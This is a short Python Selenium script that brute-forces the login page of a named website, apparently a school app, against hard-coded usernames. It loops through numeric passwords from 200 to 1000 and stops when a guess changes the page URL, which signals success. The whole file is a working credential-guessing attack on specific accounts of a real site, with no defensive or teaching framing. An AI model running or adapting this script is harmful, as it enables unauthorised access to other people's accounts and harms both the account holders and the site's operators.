from selenium import webdriver
import time
from webdriver_manager.chrome import ChromeDriverManager
driver=webdriver.Chrome(ChromeDriverManager().install())
driver.get("http://madrstiapp.com/") 
for x in range(200,1000):  # password range from 200-1000
    print('number : ', x)
   
    #driver.find_element_by_name('theuser').send_keys('hsn038763713')
    driver.find_element_by_name('theuser').send_keys('hsn0713081907') # hon hot the username 
    time.sleep(0.2)
    driver.find_element_by_name('thepass').send_keys(x)
    time.sleep(0.2)
    driver.find_element_by_xpath('/html/body/section[2]/div/div/div/div[1]/div/div/div/ul/form/div/button').click()
    time.sleep(0.2)
    try:
        if driver.current_url!= 'http://madrstiapp.com/index2.html':
            break
    except:
        pass
    
    driver.get("http://madrstiapp.com/") 
    


